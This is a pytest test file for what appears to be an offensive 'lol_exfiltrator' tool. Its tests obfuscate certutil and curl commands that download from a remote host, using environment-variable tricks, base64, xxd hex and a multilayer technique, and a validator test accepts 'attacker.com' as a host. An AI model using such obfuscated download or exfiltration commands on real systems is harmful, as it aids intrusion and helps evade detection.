import pytest
from core.obfuscator import obfuscate, _hex_ip
from lol_exfiltrator import validate_ip, validate_filename

def test_hex_ip():
    cmd = "curl 192.168.1.1"
    result = _hex_ip(cmd, "192.168.1.1")
    assert "0xC0A80101" in result

def test_windows_obfuscation():
    result = obfuscate(
        "certutil -urlcache http://192.168.1.1:8080/file",
        os_type="windows",
        binary="certutil",
        technique="env_var"
    )
    assert "SystemRoot" in result['obfuscated_command']

def test_linux_obfuscation():
    result = obfuscate(
        "curl http://192.168.1.1:8080/file",
        os_type="linux",
        binary="curl",
        technique="b64_bash"
    )
    assert "base64" in result['obfuscated_command']

def test_advanced_windows():
    result = obfuscate(
        "certutil -urlcache http://192.168.1.1:8080/file",
        os_type="windows",
        binary="certutil",
        technique="multilayer_win"
    )
    assert '4-layer cascade' in result['technique_used']

def test_advanced_linux():
    result = obfuscate(
        "curl http://192.168.1.1:8080/file",
        os_type="linux",
        binary="curl",
        technique="xxd_hex"
    )
    assert "xxd" in result['obfuscated_command']

def test_invalid_ip():
    assert validate_ip("invalid.ip.format") == False
    assert validate_ip("") == False

def test_valid_domain():
    assert validate_ip("attacker.com") == True
    assert validate_ip("localhost") == True
    assert validate_ip("127.0.0.1") == True
    assert validate_ip("::1") == True

def test_invalid_filename():
    assert validate_filename("file<name>.exe") == False
